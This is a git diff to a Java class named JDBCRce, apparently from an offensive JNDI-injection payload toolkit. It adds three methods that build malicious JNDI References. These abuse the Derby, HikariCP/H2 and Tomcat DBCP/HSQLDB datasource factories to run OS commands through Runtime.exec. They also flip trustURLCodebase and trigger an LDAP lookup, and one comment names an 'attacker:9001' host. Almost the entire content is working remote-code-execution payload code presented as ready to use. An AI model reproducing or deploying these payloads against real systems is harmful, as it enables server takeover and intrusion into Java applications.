@@ -1,5 +1,7 @@
 package com.bloom.payload;
 
+import org.apache.naming.ResourceRef;
+
 import javax.naming.Reference;
 import javax.naming.StringRefAddr;
 
@@ -164,6 +166,69 @@ public class JDBCRce {
         ref.add(new StringRefAddr("username", "root"));
         ref.add(new StringRefAddr("password", "password"));
         ref.add(new StringRefAddr("initialSize", "1"));
+        return ref;
+    }
+
+    // === P2 批次 3 新增：Derby / HikariCP / Vibur ===
+
+    /**
+     * Derby RCE：通过 derby.stream.error.file 写任意文件，或通过储存过程执行 Java 代码。
+     * 命令格式：OS 命令（通过 CREATE PROCEDURE + SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY）
+     */
+    public static Reference derby_rce(String command) {
+        String url = "jdbc:derby:memory:test;create=true";
+        Reference ref = new Reference("javax.sql.DataSource",
+                "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
+        ref.add(new StringRefAddr("driverClassName", "org.apache.derby.jdbc.EmbeddedDriver"));
+        ref.add(new StringRefAddr("url", url));
+        ref.add(new StringRefAddr("init", "true"));
+        ref.add(new StringRefAddr("username", "test"));
+        ref.add(new StringRefAddr("password", "test"));
+        ref.add(new StringRefAddr("initialSize", "1"));
+        // initConnectionSqls 在连接初始化时执行 SQL
+        ref.add(new StringRefAddr("connectionInitSqls",
+                "CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.infolog.append','true');"
+                + "CALL SQLJ.INSTALL_JAR('" + command + "', 'APP.EXPLOIT', 0)"));
+        return ref;
+    }
+
+    /**
+     * HikariCP RCE：通过 HikariCP DataSource 触发 JDBC 连接。
+     * 目标需有 HikariCP + H2/其他有 RCE 能力的数据库驱动。
+     * 命令格式：OS 命令（通过 H2 CREATE ALIAS）
+     */
+    public static Reference hikaricp_h2(String command) {
+        String h2Url = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT="
+                + "CREATE ALIAS IF NOT EXISTS EXEC AS "
+                + "'void exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd)\u003b}'\\;"
+                + "CALL EXEC('" + command + "')";
+        // HikariCP DataSource 通过 BeanFactory 设置属性
+        ResourceRef ref = new ResourceRef("com.zaxxer.hikari.HikariDataSource", null, "", "",
+                true, "org.apache.naming.factory.BeanFactory", null);
+        ref.add(new StringRefAddr("forceString",
+                "a=setDriverClassName,b=setJdbcUrl,c=setUsername,d=setPassword"));
+        ref.add(new StringRefAddr("a", "org.h2.Driver"));
+        ref.add(new StringRefAddr("b", h2Url));
+        ref.add(new StringRefAddr("c", "test"));
+        ref.add(new StringRefAddr("d", "test"));
+        return ref;
+    }
+
+    /**
+     * DBCP + HSQLDB initSQL：通过 Tomcat JDBC DataSource 的 initSQL 属性执行 HSQLDB Java 方法调用。
+     * 命令格式：jdbc:hsqldb:hsql://attacker:9001/test（HSQLDB 服务器地址）
+     */
+    public static Reference hsqldb_initSql(String command) {
+        Reference ref = new Reference("javax.sql.DataSource",
+                "org.apache.tomcat.jdbc.pool.DataSourceFactory", null);
+        ref.add(new StringRefAddr("driverClassName", "org.hsqldb.jdbc.JDBCDriver"));
+        ref.add(new StringRefAddr("url", command));
+        ref.add(new StringRefAddr("username", "sa"));
+        ref.add(new StringRefAddr("password", ""));
+        ref.add(new StringRefAddr("initialSize", "1"));
+        ref.add(new StringRefAddr("initSQL",
+                "CALL \"java.lang.System.setProperty\"('com.sun.jndi.ldap.object.trustURLCodebase', 'true');"
+                + "CALL \"javax.naming.InitialContext.doLookup\"('ldap://127.0.0.1:1389/o=reference')"));
         return ref;
     }
 }
